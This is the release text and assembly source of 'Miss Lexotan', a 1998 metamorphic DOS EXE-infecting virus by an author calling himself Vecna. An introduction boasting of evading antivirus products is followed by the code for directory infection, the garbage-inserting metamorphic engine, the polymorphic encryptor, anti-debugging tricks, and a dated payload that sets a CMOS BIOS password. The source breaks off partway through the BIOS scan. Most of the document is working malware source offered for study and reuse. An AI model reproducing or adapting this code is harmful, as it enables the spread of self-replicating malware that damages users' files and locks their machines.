Miss Lexotan 8
(c) Vecna 1998

This virus as a nice history of how it tricked AVers for long time, till they
finally added detection for it. Is my best virus so far, and the direction
that my researchs are following now. Altought is a non-resident DOS EXE
infector, i believe that some features, expecially the metamorphic engine, are
worth a look.

The virus insert garbage instructions between real instructions, and change
the real code for synonimous. Like:

  mov ah, 40h
  mov cx, 32
  int 21h

Will become:

    <garbage>
  mov ah, 40h
    <garbage>
  mov cx, 32
    <garbage>
  int 21h
     <garbage>

The code also get changed in another way. For example:

  mov cx, 32

Can become:

  push 32
     <garbage>
  pop cx

and so on...

The virus decript the virus genotype (plain virus), disasm it instruction by
instruction, inserting garbling. Then it fix the jumps, calls and like(that
got their offsets changed). Then a polymorphic encriptor/decriptor is created,
and the virus genotype is encripted.

In the virus genotype, you will found several XOR BP, XXXX instructions. These
ones are processed by the engine in a diferent way. The immediate value are
the registers used in this portion. The garbling engine will not use they, so
the used regs dont get altered, only the free ones at the moment. This make
the engine insert instructions using the free regs at this moment, thus
generating complex code. These flags also warn the engine about the possibility
of use FLAGS and STACK modification instructions, between other things.

The garbling routine can generate almost all x86 instructions, making the virus
very hard to detect. Several of these garbling instructions are inserted, being
the motive to to the virus have a diference so big between first generation
virus(size <6kb) and the infected sample (virus >20kb).

The decriptor/encriptor have lots of crypt instructions, and between these ones
some using the counter, to make cryptanalisis dificult. Zhengxi detector for a
early version was based in this. Altought the number of crypt instructions made
the decryption of the genotype(and thus scan string detection) impossible
without know all keys, the relation between they remained the same. Using the
counter eliminated, partially, this vulnerability to cryptanalisis.

The virus is build using anti-heuristic and pro-metamorphic features. This mean
that values are obtained using math instructions, instead of fixed MOVs. This
make the virus harder to detect and, as these instructions can be exchanged
by synonimous more easily, more metamorphic.

The entrypoint of the virus is protected too. In the middle of the virus, are
placed chunks of code that jump (usign jmp or call opcodes) to start of virus
or to another of these chunkz. This way, the entrypoint is protected and is
very dificult to determine the size of the appended virus body.

The virus layout in a infected file:

|-----------------|
|     HEADER      |
|-----------------|
|                 |
|                 |
|      HOST       |
|      CODE       |
|                 |
|                 |
|-----------------|
|                 |
|                 |
|   METAMORPHED   |
|      VIRUS      |
|                 |
|                 |
|-----------------|
|   DECRIPTOR     |
|-----------------|
|   ENCRIPTED     |
|    GENOTYPE     |
|-----------------|

All variables in virus code are accessed throught a structure, becoz we use a
separated DATA segment for the virus, allocated at runtime. This is done coz
offsets in virus code change.

Several EQUates in source code define the beahvior of the compiled virus. This
is done to make tests and research viable.

To the ones that are interessed in read more about this field, i recommend the
study of ZCME, AZCME and AZCME32 by Z0MBiE and my own W95/RegSwap, and a look
in virus as TMC and Fly... And dont forget old BadBoy virus too :)

If you're also a researcher in metamorphic fields, your email will be welcome.
If you just got a new and excellent idea, that will change the metamorphic
field for ever and like, write a virus using this tech first and only then
email me... A base of 95% of these ideas i receive are inviable, already
implemented or too lame to even think about implement they... ;)

Ask about how compile it and you will win my hate

vecna_br@hotmail.com

;(----------------------------------LEXOTAN.ASM------------------------------)
;Miss Lexotan 6mg - version 0.8
;Metamorphic non-resident EXE infector
;Coded by Vecna
;1998 (c) Brazil

.model tiny
.stack 100h
.data
.186
.code
locals
org 0

       TRUE       = 1
       FALSE      = 0

       USE32       = TRUE
       CMOSPSW     = TRUE
       METAMORPH   = TRUE
       CHANGEDIR   = FALSE

       STACKSIZE   = 60
       STACKDEEP   = 6

       MAX_REC     = 2

       MAX_ENTRIES = 48

       DIV_VALUE   = 19
       MOD_VALUE   = 15

       ofs equ offset
       by equ byte ptr
       wo equ word ptr
       dwo equ dword ptr

       _AX = 00000000b
       _CX = 00000001b
       _DX = 00000010b
       _BX = 00000011b
       _SP = 00000100b
       _BP = 00000101b
       _SI = 00000110b
       _DI = 00000111b

prb    macro prc, rte
local  __no
       cmp al, prc
       ja __no
       call rte
       jmp done
__no:
endm

       include jmps386.inc

commands record  {
       __fill    :1
       __extra   :1,
       __stack   :1,
       __inte    :1
       __junk    :3,
       __flag    :1,
       __di      :1,
       __si      :1,
       __bp      :1,
       __sp      :1,
       __bx      :1,
       __dx      :1,
       __cx      :1,
       __ax      :1  }

       NO_GARBLE = mask __ax + mask __cx + mask __dx + mask __bx + \
                   mask __sp + mask __bp + mask __si + mask __di + \
                   mask __flag + mask __fill

stopgarbling macro
       dw 0f581h, NO_GARBLE
endm

mcttable struc
       ipoffset dw 0
       instrsz  dw 0
       dspl     dw 0
ends

iittable struc
       newip dw 0
       oldip dw 0
ends

vstrc  struc
       recursion  db 0
       _entry     db 0
       entries    dw 0
       seed1      dw 0                         ;data structures that will be
       seed2      dw 0                         ;accessed at runtime in a
       sucessfull dw 0                         ;allocated DATA segment
       num_infect dw 0
       infected   dw 0
       mctpointer dw 0
       iitpointer dw 0
       int24      dd 0
       award      db 6 dup (0)
       mem_cs     dw 0
       mem_ip     dw 0
       mem_ss     dw 0
       mem_sp     dw 0
       gregs      dw 0
       cryptosux  dw 0
       dta         equ this byte
         dta_drive db 0
         dta_name  db 8 dup (0)
         dta_ext   db 3 dup (0)
         dta_sattr db 0
         dta_diren dw 0
         dta_dircl dw 0
         dta_junk  dd 0
         dta_attr  db 0
         dta_time  dw 0
         dta_date  dw 0
         dta_size  dd 0
         dta_fname db 13 dup(0)
       fmask      dw 0, 0, 0
       crypttable dw 0, 0, 0
       cryptofuck dw 0, 0
                  dw 0, 0
                  dw 0, 0
                  dw 0, 0
                  dw 0, 0
       exe_header equ this byte
         exe_mark dw 0
         exe_modp dw 0
         exe_divp dw 0
         exe_relo dw 0
         exe_head dw 0
         exe_min  dw 0
         exe_max  dw 0
         exe_ss   dw 0
         exe_sp   dw 0
         exe_crc  dw 0
         exe_ip   dw 0
         exe_cs   dw 0
         exe_rel@ dw 0
         exe_ovr  dw 0
                  db 40-($-exe_header) dup (0)
       wdir       db 5 dup (0)
       curdir     db 65 dup (0)
       tentry     dw MAX_ENTRIES dup (0)
       idbase     db 200 dup (0)
       mct        db 1024*6 dup (0)
       iit        db 1024*12 dup (0)
       copybase   db 1024*8 dup (0)
       decoder    db 1024*1 dup (0)
       encoder    db 1024*1 dup (0)
       finalbase  db 1024*32 dup (0)
ends

virusstart:
       push ds                                 ;notice the XOR BP, ?
       pop bx                                  ;they're used by the engine to
       mov ax, 0fff0h                          ;know what regs are used and
_cs_   equ wo $-2                              ;what are free at each moment...
       xor bp, mask __fill + mask __ax + mask __bx + mask __flag
       add ax, bx
       xor bp, mask __fill + mask __ax + mask __flag
       add ax, 10h
       push ax
       mov ax, 0
_ip_   equ wo $-2
       push ax
       push es
       mov ax, 20cdh
       push ds
       add ax, 2feah - 20cdh
       xor bp, mask __fill + mask __ax + mask __bx + mask __flag
       int 21h
       mov ax, 3524h - 5e9fh
       push es
       add ax, 5e9fh                           ;also notice that we avoid any
       push bx                                 ;direct move... this is done to
       int 21h                                 ;get more variants for a instr,
       push es                                 ;beside the obvious a-heuristic
       push bx                                 ;function
       xor bp, mask __fill + mask __ax + mask __bx
       mov bx, size vstrc
       call alloc_mem
       jc error_mem
       xor bp, mask __fill + mask __ax + mask __flag
       push ax
       push ax
       pop ds
       pop es
       call random_init
       xor ax, ax
       mov wo ds:[recursion], ax
       mov wo ds:[entries], ax
       xor bp, mask __fill + mask __ax + mask __di + mask __dx + \
               mask __flag
       cld
       mov di, int24                           ;using pointers to our own code
       mov dx, di                              ;is something we should avoid,
       mov ax, 03b0h                           ;coz the offsets change at each
       stosw                                   ;mutation... we must construct
       mov ax, 0cfh                            ;they in a dynamic way
       stosb
       xor bp, mask __fill + mask __ax + mask __dx + mask __flag
       mov ax, 2524h + 98f1h
       sub ax, 98f1h
       int 21h
       cld
       mov ax, 1aaah + 0fe7ah
       mov dx, dta
       sub ax, 0fe7ah
       int 21h
       xor bp, mask __fill + mask __ax + mask __di + mask __flag
       mov di, finalbase
       mov ax, 'c('
       stosw
       add ax, ' )'-'c('
       stosw
       add ax, 'eV'-' )'                       ;copyright
       stosw
       add ax, 'nc'-'eV'
       stosw
       add ax, 'a'-'nc'
       stosw
       mov wo ds:[num_infect], 5
       call infect_dir                         ;infect current directory
IF CHANGEDIR EQ TRUE
       mov by ds:[curdir], '\'
       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __dx
       mov ax, 4709h - 6452h
       xor dx, dx
       add ax, 6452h
       mov si, ofs curdir+1
       int 21h
       jc error_dir
       mov di, ofs wdir
       push di
       mov ax, 'D\'
       stosw
       add ax, 'SO'-'D\'                       ;dynamic creation of PATH and
       stosw                                   ;infection
       xor ax, ax
       stosb
       mov ax, 3ba4h + 56feh
       pop dx
       sub ax, 56feh
       int 21h
       jc error_dir
       mov wo ds:[num_infect], 3
       call infect_dir
       mov ax, 3bffh + 0ff00h
       mov dx, ofs curdir
       sub ax, 0ff00h
       int 21h
error_dir:
ENDIF
       call free_mem
error_mem:
       xor bp, mask __fill + mask __dx + mask __ax + mask __flag
       pop dx
       mov ax, 2524h xor 98eah
       pop ds
       xor ax, 98eah
       int 21h
       xor bp, mask __fill + mask __dx + mask __ax + mask __flag
       mov ax, 1a99h * 2
       pop dx
       pop ds
       shr ax, 1                               ;is time for our payload?
       int 21h
       xor bp, mask __fill + mask __ax + mask __flag
       call copyright
       pop ds
       pop es
       xor bp, mask __fill + mask __cx + mask __dx + mask __ax + \
               mask __bx + mask __stack + mask __inte + mask __flag
       pop cx
       pop dx
       cli
       mov ax, 0
_ss_   equ wo $-2
       mov bx, ds
       add ax, bx
       add ax, 10h
       mov ss, ax
       mov sp, 0f00h
_sp_   equ wo $-2
       sti
       xor bp, mask __fill + mask __cx + mask __dx + mask __flag
       push dx
       push cx
       xor bp, mask __fill + mask __cx + mask __ax + mask __stack
       mov cx, 9
       xor ax, ax
pushagain:
       push ax
       dec cx                                  ;clear all regsiters and return
       jnz pushagain                           ;to host file...
       stopgarbling
       popa
       popf
       retf

       xor bp, mask __fill + mask __ax + mask __stack + mask __flag
free_mem:
       mov ax, 49afh * 2
       shr ax, 1
       int 21h
       ret

       xor bp, mask __fill + mask __ax + mask __bx + mask __cx
alloc_mem:
       push cx
       mov ax, 4c01h
       mov cl, 4
       sub bx, -15
       shr bx, cl
       sub ax, 4c01h - 4800h
       int 21h
       pop cx
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __dx + \
               mask __flag
infect_dir:
       mov wo ds:[infected], 0
       cld
       mov di, fmask
       mov dx, di
       mov ax, '.*'
       stosw
       add ax, 'XE'-'.*'                       ;build filesearch mask
       stosw
       mov ah, 0
       stosw
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx + \
               mask __flag
       mov ax, 4e98h + 37f2h
       mov cx, 27h
nextf:
       sub ax, 37f2h
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx
       int 21h
       jc not_found
       xor bp, mask __fill + mask __dx
       mov dx, dta_fname
       call infect_dsdx                        ;add virus copy to file
       xor bp, mask __fill + mask __ax
       cmp wo ds:[sucessfull], 1
       jne not_infected
       inc wo ds:[infected]
       mov ax, wo ds:[infected]
       cmp wo ds:[num_infect], ax
       je not_found
not_infected:
       mov ax, 4fdah + 37f2h
       jmp nextf
not_found:
       ret

       xor bp, mask __fill + mask __ax + mask __flag
engine:
       mov ax, mask __bx + mask __ax + mask __extra + mask __flag
       mov wo ds:[gregs], ax                   ;set initial garbling flags
       cld
       xor bp, mask __fill + mask __ax + mask __di + mask __flag
       mov di, idbase
       mov ax, 1110011100000001b
       stosw
       mov ax, 0000001000100111b               ;these tables that we build,
       stosw                                   ;again in a dynamic way, will
       mov ax, 1101010011111110b               ;be used by the engine to know
       stosw                                   ;the size of each instruction
       mov ax, 1111111100001000b               ;being processed
       stosw
       mov ax, 0000000101100010b
       stosw
       mov ax, 1001000011110000b
       stosw
       mov ax, 1111011000000001b
       stosw
       mov ax, 0000000111110100b
       stosw
       mov ax, 1111100011111100b
       stosw
       mov ax, 1110011100010001b
       stosw
       mov ax, 0001001000100110b
       stosw
       mov ax, 0111000011110000b
       stosw
       mov ax, 1111111100010010b
       stosw
       mov ax, 0000000111101011b
       stosw
       mov ax, 1111000011111100b
       stosw
       mov ax, 1111010000000001b
       stosw
       mov ax, 0000000110100100b
       stosw
       mov ax, 0100000011100000b
       stosw
       mov ax, 1111110100000001b
       stosw
       mov ax, 0001000011001100b
       stosw
       mov ax, 1100111111111111b
       stosw
       mov ax, 1111011000010001b
       stosw
       mov ax, 0000001011000010b
       stosw
       mov ax, 1100110111111111b
       stosw
       mov ax, 1110011000000001b
       stosw
       mov ax, 0000010000000110b
       stosw
       mov ax, 1100100011111111b
       stosw
       mov ax, 1111111100000001b
       stosw
       mov ax, 0001001011001001b
       stosw
       mov ax, 1110000011111100b
       stosw
       mov ax, 1111010000001000b
       stosw
       mov ax, 0000000110000100b
       stosw
       mov ax, 0110000011111110b
       stosw
       mov ax, 1111110000000001b
       stosw
       mov ax, 0000001011101100b
       stosw
       mov ax, 1110010011111100b
       stosw
       mov ax, 1111111000000001b
       stosw
       mov ax, 0000000110101010b
       stosw
       mov ax, 1101011111111111b
       stosw
       mov ax, 1111100000001000b
       stosw
       mov ax, 0000100011011000b
       stosw
       mov ax, 1100010011111110b
       stosw
       mov ax, 1111110000001000b
       stosw
       mov ax, 0000001110001000b
       stosw
       mov ax, 1010000011111100b
       stosw
       mov ax, 1111100000000010b
       stosw
       mov ax, 0000001110110000b
       stosw
       mov ax, 1011100011111000b
       stosw
       mov ax, 1111111001000001b
       stosw
       mov ax, 0000100010101000b
       stosw
       mov ax, 0000000011000100b
       stosw
       mov ax, 1111110000001000b
       stosw
       mov ax, 0000100111010000b
       stosw
       mov ax, 1100000011111110b
       stosw
       mov ax, 1111110001101000b
       stosw
       mov ax, 0100100010000000b
       stosw
       mov ax, 1100011011111110b
       stosw
       mov ax, 1100011001000001b
       stosw
       mov ax, 0001100000000100b
       stosw
       mov ax, 1111011011110110b
       stosw
       xor bp, mask __fill + mask __di + mask __si + mask __flag
       mov di, finalbase
       mov si, copybase                        ;here, the magic start...
       mov wo ds:[mctpointer], 0
       mov wo ds:[iitpointer], 0
       call garbage                            ;insert some garbling
ninstr:
       pusha
       xor bp, mask __fill + mask __ax + mask __bx + mask __di + \
               mask __si + mask __flag
       mov ax, si
       sub ax, copybase                        ;insert current IP to table of
       xchg ax, bx                             ;NewIP-OldIP, that we will need
       mov ax, di                              ;to fix all offsets in new virus
       sub ax, finalbase                       ;copy
       mov di, iit
       add di, wo ds:[iitpointer]
       add wo ds:[iitpointer], size iittable
       mov wo ds:[di.newip], ax
       mov wo ds:[di.oldip], bx
       popa
       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __dx
       push si
       mov ax, wo ds:[si]
       mov dx, ax
       cmp ax, -1
       je noerror
       cmp ax, 0f581h
       jne check_opcode
       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __flag
       pop si                                  ;current instruction is a XOR BP
       lodsw                                   ;so, dont copy it to virus code,
       lodsw                                   ;and use the immediate value as
       mov wo ds:[gregs], ax                   ;new engine flags
       jmp ninstr
       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __dx + mask __cx
check_opcode:
       mov ax, dx
       xor cx, cx
       cmp al, 0e8h                            ;call/jmp/jcc are handled here
       jne no_call                             ;when we mutate, the distance
do_call:                                       ;between the code change. Coz
       mov cx, 3                               ;this we build this table
       mov ax, 1
       pusha
make_correlation_table:
       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __cx
       mov di, mct
       add di, wo ds:[mctpointer]
       add wo ds:[mctpointer], size mcttable
       sub si, copybase
       mov wo ds:[di.ipoffset], si
       mov wo ds:[di.instrsz], cx
       mov wo ds:[di.dspl], ax
       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __dx + mask __cx
       popa
       xor ax, ax
       jmp op_done
no_call:
       and ax, 1111100011111111b
       cmp ax, 800fh                           ;notice that we only handle the
       jne no_jcc                              ;32b versions of the conditional
       mov cx, 4                               ;jumps... We have macros (coded
       mov ax, 2                               ;by Z0MBiE) to always use such
       pusha                                   ;jmps in virus code. This way,
       jmp make_correlation_table              ;we arent limited to the 127 byte
no_jcc:                                        ;limit when inserting garbling ;)
       mov ax, dx
       cmp al, 0e9h                            ;normal jmps also are in 32b
       je do_call
       dec cx
       dec si
prefix:
       inc cx
       inc si
       mov dx, wo ds:[si]
       mov ax, dx
       and al, 11100111b
       cmp al, 00100110b
       je prefix
       mov ax, dx
       and al, 11111100b
       cmp al, 01100100b
       je prefix
       mov ax, dx
       cmp al, 0f0h                            ;handle prefixes
       je prefix
       cmp al, 0f2h
       je prefix
       cmp al, 0f3h
       je prefix
       push cx
       call gisz                               ;get instruction size
       pop cx
op_done:
       add cx, ax
       xor bp, mask __fill + mask __cx + mask __si + mask __di
       pop si
IF METAMORPH EQ TRUE
       call mgen                               ;mutate instruction before we
ELSE                                           ;copy it!
       cld
       rep movsb
ENDIF
       xor bp, mask __fill + mask __di + mask __si + mask __stack + \
               mask __flag
       call garbage                            ;garble
       jmp ninstr
noerror:
       add sp, 2
       push di                                 ;now is time to fiz all the mess
       pusha
       xor bp, mask __fill + mask __di + mask __si + mask __ax
next_jmp:
       sub wo ds:[mctpointer], size mcttable
       mov si, wo ds:[mctpointer]              ;get destination of jmp/call
       add si, mct                             ;and find the correspondence in
       mov ax, wo ds:[si.ipoffset]             ;the metamorphed virus copy
       call search_iit
       mov ax, wo ds:[di.newip]
       push ax
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __bx + mask __flag
       mov bx, ax
       add bx, wo ds:[si.dspl]
       mov ax, wo ds:[bx+finalbase]
       add ax, wo ds:[si.ipoffset]
       add ax, wo ds:[si.instrsz]
       call search_iit
       mov ax, wo ds:[di.newip]                ;recalculate the new relative
       pop bx                                  ;distance
       add bx, wo ds:[si.dspl]
       sub ax, bx
       xor bp, mask __fill + mask __ax + mask __bx
       sub ax, wo ds:[si.instrsz]
       inc ax
       cmp by ds:[bx+finalbase-1], 0e9h
       je normal
       cmp by ds:[bx+finalbase-1], 0e8h
       je normal
       inc ax
normal:
       mov wo ds:[bx+finalbase], ax            ;and fix it!
       cmp wo ds:[mctpointer], 0
       jnz next_jmp                            ;all jmp/call/jcc table done?
       xor bp, mask __fill + mask __si + mask __di + mask __cx + \
               mask __ax + mask __flag
       popa
       call make_decoder                       ;now, call the tiny poly engine
       pop ax                                  ;to encrypt the virus *genotype*
       push si                                 ;only
       mov si, di
       mov di, ax                              ;(Zenghxi suggested changing the
       cld                                     ;poly engine for a strong crypt
       rep movsb                               ;routine... I agree now :) )
       xor bp, mask __fill + mask __si + mask __di + mask __ax + \
               mask __bx + mask __flag
       pusha
       mov bx, di
       sub bx, finalbase
       mov ax, ofs clean_copy
       push bx
       call search_iit
       pop bx
       mov di, wo ds:[di.newip]                ;here we fix the init_base, that
       mov wo ds:[di+1+finalbase], bx          ;is from where virus engine will
       popa                                    ;read genotype in next generation
       mov bx, ds
       xor bp, mask __fill + mask __di + mask __ax + mask __bx + \
               mask __cx + mask __extra
       pop cx
       push ds es di
       push cs cs
       pop es ds
       xor di, di
       cld
       mov al, 0eah                            ;overwrite start of our own code
       stosb                                   ;with a JMP FAR to the encryptor
       mov ax, cx
       stosw                                   ;we need thios coz the poly is
       mov ax, bx                              ;build in a separated segment
       stosw
       pop di es ds
       xor bp, mask __fill + mask __si + mask __di + mask __ax + \
               mask __bx + mask __cx
       mov si, copybase
       mov cx, ofs viralend-ofs virusstart
       xor ax, ax
       push cs
       call ax                                 ;call the poly encryptor!
       xor bp, mask __fill + mask __di + mask __dx + mask __cx + \
               mask __flag
       mov wo ds:[gregs], mask __extra + mask __flag
       call garbage
       call garbage                            ;garble a bit more
       call garbage
       mov dx, di
       mov cx, finalbase                       ;and calculate final size!! :)
       sub dx, cx
       xchg cx, dx
       ret

       xor bp, mask __fill + mask __si + mask __di + mask __ax + \
               mask __dx + mask __bx
gisz:
       mov si, idbase-1
dmain:
       inc si
       mov ax, dx
       mov bl, by ds:[si]
       mov bh, bl
       inc si
       and al, by ds:[si]
       inc si
       cmp al, by ds:[si]
       jne dmain
       mov ax, dx
       and ax, 11100011111110b
       cmp ax, 00000011110110b
       jne dntest
       or bh, 1000000b
dntest:
       mov al, bh
       and al, 111b
       xor bp, mask __fill + mask __di + mask __ax + mask __dx + \
               mask __bx + mask __cx
       mov cl, al                              ;this small routine get size of
       mov al, bh                              ;instructions. Based in CMT
       and al, 1000000b                        ;tables
       jz dnb
       mov ax, dx
       and al, 1
       inc ax
       add cl, al
       mov al, bh
       and al, 100000b
       jz dnb
       mov ax, dx
       and al, 11b
       cmp al, 11b
       jne dnb
       dec cx
dnb:
       mov al, bh
       and al, 1000b
       jz dnmodrm
       add cx, 2
       mov ax, dx
       xor bp, mask __fill + mask __di + mask __ax + mask __bx + \
               mask __cx
       and ah, 11000111b
       cmp ah, 110b
       je da2
       and ah, 11000000b
       jz dnmodrm
       cmp ah, 01000000b
       je da1
       cmp ah, 11000000b
       je dnmodrm
da2:
       inc cx
da1:
       inc cx
dnmodrm:
       mov ch, 0
       mov ax, cx
       mov bl, 0
       ret

       xor bp, mask __fill + mask __di + mask __ax + mask __flag
make_decoder:                                  ;poly engine that encrypt the
       cld                                     ;genotype(this you're reading)
       mov wo ds:[gregs], mask __ax + mask __cx + mask __si + \
                          mask __di
       mov di, crypttable
       mov ax, 0000010000101100b
       stosw
       mov ax, 0010110000000100b               ;cryptor instructions
       stosw
       mov ax, 0011010000110100b
       stosw
       mov ax, 0c132h
       stosw
       stosw
       xor bp, mask __fill + mask __di + mask __ax + mask __flag + \
               mask __cx
       mov ax, 0c12ah
       mov cx, 0c102h
       stosw
       xchg ax, cx
       stosw
       stosw
       xchg ax, cx
       stosw
       mov ax, 0c8d2h
       mov cx, 0c0d2h
       stosw
       xchg ax, cx
       stosw
       stosw
       xchg ax, cx
       stosw
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __flag
       mov si, encoder
       mov di, decoder
       mov ax, 10h
       call random
       add ax, 8                               ;use 8-24 crypt instructions
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __cx + mask __flag
       mov cx, ax
       push di
       push si
       call garbage
       mov al, 0fch
       stosb
       mov by ds:[si], al
       lodsb
       call garbage
       push di
       push si
       call garbage
       mov al, 0ach
       stosb
       mov by ds:[si], al
       lodsb
       mov wo ds:[cryptosux], si
       lodsw
       call garbage
       mov ax, cx
       shl ax, 1
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __cx + mask __bx + mask __flag
       mov bx, si
       add bx, ax
       push bx
dmninstr:
       push cx
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __bx + mask __flag
       mov ax, 3
       call random                             ;please notice the elegance...
       shl ax, 1
       add ax, crypttable                      ;we build the encrypt/decrypt
       xchg si, ax                             ;routine at same time, but in
       mov ax, wo ds:[si]                      ;a reverse way. Hard to write,
       stosb                                   ;but code exits in a ready2run
       mov by ds:[bx-2], ah                    ;format ;)
       mov ax, -1
       call random
       inc ax
       stosb
       dec bx
       mov by ds:[bx], al
       dec bx
       call garbage
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __cx + mask __bx
       pop cx
       dec cx
       jnz dmninstr
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __bx
       mov si, wo ds:[cryptosux]
       mov ax, 5
       call random                             ;build the key/counter mess
       shl ax, 1                               ;instruction, to avoid attacks
       mov bx, ofs cryptofuck                  ;based in cryptanalisis, as
       shl ax, 1                               ;Zhengxi did for Lexotan.6
       add bx, ax
       mov ax, wo [bx]                         ;(not good enought, it continue
       stosw                                   ;vulnerable)
       mov ax, wo [bx+2]
       mov wo [si], ax                         ;*changed in w32 versions*
       xor bp, mask __fill + mask __di + mask __si + mask __ax
       pop si
       mov al, 0aah
       stosb
       mov by ds:[si], al
       lodsb
       call garbage
IF USE32 EQ TRUE
       mov al, 49h
       stosb
       mov by ds:[si], al
       lodsb
       mov ax, 850fh
       stosw
       mov wo ds:[si], ax                      ;use the larger LOOP variant
       lodsw
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __bx + mask __dx + mask __flag
       pop dx
       pop bx
       mov ax, si
       sub ax, dx
       add ax, 2
       neg ax
       mov wo ds:[si], ax
       lodsw
       mov ax, di
       sub ax, bx
       add ax, 2
       neg ax
       stosw
ELSEIF
       mov al, 0e2h
       stosb
       mov by ds:[si], al                      ;use common LOOP (limit 127b)
       lodsb                                   ;(will fuck if too much garble)
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __bx + mask __dx + mask __flag
       pop dx
       pop bx
       mov ax, si
       sub ax, dx
       inc ax
       neg ax
       mov by ds:[si], al
       lodsb
       mov ax, di
       sub ax, bx
       inc ax
       neg ax
       stosb
ENDIF
       xor bp, mask __fill + mask __di + mask __si + mask __ax + \
               mask __flag
       call garbage
       mov al, 0c3h
       stosb
       mov al, 0cbh
       mov by ds:[si], al
       lodsb
       xor bp, mask __fill + mask __di + mask __si + mask __cx + \
               mask __flag
       pop si
       pop cx
       sub di, cx
       xchg cx, di
       ret

       stopgarbling
random_init:
       pusha
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx + \
               mask __flag
       mov ax, 2a99h xor 1111h
       xor ax, 1111h
       int 21h
       xor bp, mask __fill + mask __cx + mask __dx + mask __flag
       mov wo ds:[seed1], cx
       mov wo ds:[seed2], dx
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx + \
               mask __flag
       mov ax, 2c00h * 2
       shr ax, 1
       int 21h
       xor bp, mask __fill + mask __cx + mask __dx + mask __flag
       sbb wo ds:[seed1], cx
       xor wo ds:[seed2], dx
       stopgarbling
       popa
       ret

random:
       pusha
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx + \
               mask __bx + mask __flag
       mov cx, ax
       mov bx, wo ds:[seed1]
       in ax, 40h
       sub ax, wo ds:[seed2]
       xor ax, bx
       adc ax, dx
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx + \
               mask __bx
       or cx, cx
       jz no_div
       xor bp, mask __fill + mask __ax + mask __cx + mask __dx + \
               mask __bx + mask __flag
       xor dx, dx
       div cx
       xor bp, mask __fill + mask __ax + mask __dx
no_div:
       mov wo ds:[seed1], dx
       mov wo ds:[seed2], ax
       xor bp, mask __fill + mask __bp + mask __dx + mask __stack
       mov bp, sp
       mov wo ss:[bp+7*2], dx
       xor bp, mask __fill + mask __bp + mask __di + mask __stack + \
               mask __inte
       cli
       mov di, wo ss:[bp+(7*2)+2]              ;kewl a-debug!!!
       cmp by cs:[di], 0cch                    ;check if breakpoint is waiting
debug:                                         ;for us (routine was StepedOver
       jz debug                                ;with the debugger)
       sti
       stopgarbling
       popa
       ret

       xor bp, mask __fill + mask __ax + mask __dx + mask __flag
copyright:
       push ds
       mov ax, 2a0ah + 0fe7ah
       pop es
       sub ax, 0fe7ah                          ;get date
       int 21h
       xor bp, mask __fill + mask __ax + mask __dx
       sub dx, 0918h
       jnz no_payload                          ;time to activate?
       xor bp, mask __fill + mask __ax
       mov ax, 0000
generation equ wo $-2
       test ax, 011b                           ;generation MOD 4 == 0 ?
       jne no_payload
       xor bp, mask __fill + mask __ax + mask __flag + mask __extra
       mov ax, 3
       int 10h
       mov ax, 'iM'
       call print_reverse
       add ax, 'ss'-'iM'
       call print_reverse
       add ax, 'L '-'ss'
       call print_reverse
       add ax, 'xe'-'L '
       call print_reverse
       add ax, 'to'-'xe'
       call print_reverse
       add ax, 'na'-'to'
       call print_reverse
       add ax, '6 '-'na'
       call print_reverse
       add ax, 'gm'-'6 '
       call print_reverse
       add ax, ' ,'-'gm'
       call print_reverse
       mov ax, 100
       call random                             ;have 3 strings...
       xor bp, mask __fill + mask __ax + mask __extra
       cmp ax, 33
       jbe garota
       cmp ax, 66
       jbe nome
       xor bp, mask __fill + mask __ax + mask __flag + mask __extra
       mov ax, 'el'
       call print_reverse
       add ax, 'bm'-'el'
       call print_reverse
       add ax, 'er'-'bm'
       call print_reverse            ;"Miss Lexotan 6mg, lembrei do nome!"
       add ax, ' i'-'er'             ;(Miss Lexotan 6mg, i remember the name!)
       call print_reverse
       add ax, 'od'-' i'
       call print_reverse
       add ax, 'n '-'od'
       call print_reverse
       add ax, 'mo'-'n '
       call print_reverse
       add ax, '!e'-'mo'
       call print_reverse
       jmp password
nome:
       mov ax, ' o'
       call print_reverse
       add ax, 'on'-' o'
       call print_reverse            ;"Miss Lexotan 6mg, o nome dela e..."
       add ax, 'em'-'on'             ;(Miss Lexotan 6mg, her name is...)
       call print_reverse
       add ax, 'd '-'em'
       call print_reverse
       add ax, 'le'-'d '
       call print_reverse
       add ax, ' a'-'le'
       call print_reverse
       add ax, '.‚'-' a'
       call print_reverse
       add ax, '..'-'.‚'
       call print_reverse
       jmp password
garota:
       mov ax, 'ag'
       call print_reverse
       add ax, 'or'-'ag'
       call print_reverse            ;"Miss Lexotan 6mg, garota..."
       add ax, 'at'-'or'             ;(Miss Lexotan 6mg, girl...)
       call print_reverse
       add ax, '..'-'at'
       call print_reverse
       add ax, '.'-'..'
       call print_reverse
password:
IF CMOSPSW EQ TRUE
       xor bp, mask __fill + mask __ax + mask __di + mask __flag
       mov di, award
       cld
       mov ax, 'WA'                            ;set password in POST section
       stosw                                   ;in CMOS memory
       mov ax, 'RA'
       stosw
       mov ax, 'D'
       stosw
       mov ax, 0f000h
       mov es, ax
       xor di, di
       xor bp, mask __fill + mask __ax + mask __di + mask __cx + \
               mask __si
       mov cx, -1
scan:
       pusha
       mov si, award                           ;determine BIOS type
       mov cx, 5
       repe cmpsb
       popa
       jz award_psw
       inc di                                  ;America Megatrends BIOS...
       dec cx
       jnz scan
